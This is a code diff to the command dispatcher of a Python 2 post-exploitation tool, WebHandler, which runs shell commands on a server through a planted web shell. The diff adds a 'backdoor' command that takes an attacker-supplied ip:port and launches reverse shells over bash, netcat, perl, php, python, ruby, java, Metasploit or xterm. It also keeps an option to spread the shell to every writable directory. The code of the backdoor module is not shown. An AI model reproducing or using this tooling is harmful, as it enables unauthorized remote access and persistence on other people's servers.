@@ -11,7 +11,7 @@ else:
 from core.libs.menu import Colors, banner
 from core.libs.request_handler import make_request
 from core.modules.info import info
-from core.modules.shell_handler import shell_handler
+from core.modules.backdoor import backdoor
 from core.modules.file_handler import file_handler
 from core.modules.enumerate import enumerate
 
@@ -56,7 +56,7 @@ class Commander(object):
                     # Get stored info from
                     elif command == 'info':
                         info.get_information()
-                        
+
                     # Update WebHandler
                     elif command == 'update':
                         info.update()
@@ -65,11 +65,38 @@ class Commander(object):
                     elif command == 'banner':
                         print banner
 
-                    # Spreat the shell to all writable directories
-                    elif command == 'spread':
-                        shell_handler.spread_shell()
+                    elif command.startswith('backdoor'):
+                        if len(command.split()) == 3:
+                            ip = command.split()[2].split(':')[0]
+                            port = command.split()[2].split(':')[1]
+                            if command.split()[1] == "bash":
+                                backdoor.bash(ip, port)
+                            elif command.split()[1] == "java":
+                                backdoor.java(ip, port)
+                            elif command.split()[1] == "msf":
+                                backdoor.msf(ip, port)
+                            elif command.split()[1] == "netcat":
+                                backdoor.netcat(ip, port)
+                            elif command.split()[1] == "perl":
+                                backdoor.perl(ip, port)
+                            elif command.split()[1] == "php":
+                                backdoor.php(ip, port)
+                            elif command.split()[1] == "python":
+                                backdoor.python(ip, port)
+                            elif command.split()[1] == "ruby":
+                                backdoor.ruby(ip, port)
+                            elif command.split()[1] == "xterm":
+                                backdoor.xterm(ip)
+                            else:
+                                backdoor.list()
+                        elif len(command.split()) == 2:
+                            if command.split()[1] == "spread":
+                                backdoor.spread()
+                            else:
+                                backdoor.list()
+                        else:
+                            backdoor.list()
 
-                    # Displays the target's 'health' (CPU, Memory usage etc)
                     elif command.startswith('enum'):
                         if len(command.split()) == 2:
                             if command.split()[1] == "health":
@@ -91,7 +118,7 @@ class Commander(object):
 
                     elif command.startswith('download'):
                         if len(command.split()) < 2:
-                            print '\n[!] Usage: download [remote_file_path] [local_file_path| <optional argument>]'
+                            print '\n[!] Usage: download [remote_file_path] <local_file_path>'
                         else:
                             rfile_path = command.split()[1]
                             if len(command.split()) == 2:
@@ -120,7 +147,7 @@ class Commander(object):
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
                                             self.cwd = command.split()[-1]
                                         else:
-                                            print 'bash: cd: {}: No such file or directory'.format(command.split()[-1])
+                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
                                     else:
                                         cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
@@ -149,7 +176,7 @@ class Commander(object):
 
                                 # If the executed command doesn't exist
                                 else:
-                                    errmsg = '{}: command not found'.format(unquote(command))
+                                    errmsg = '{0}: command not found'.format(unquote(command))
                                     if command.split()[0] == 'echo':
                                         pass
                                     else:
@@ -159,12 +186,12 @@ class Commander(object):
 
                 # Exit WebHandler if user provides exit as a command
                 else:
-                    print '\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
+                    print '\n[+] Preformed "{0}" commands on the server, {1}\n[!] Connection closed'.format(i, info.host_ip.split(',')[0])
                     break
 
             # Exit WebHandler if it recieved a break (^c)
             except KeyboardInterrupt:
-                print '\n\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
+                print '\n[+] Preformed "{0}" commands on the server, {1}\n[!] Connection closed'.format(i, info.host_ip.split(',')[0])
                 break
             i += 1
 
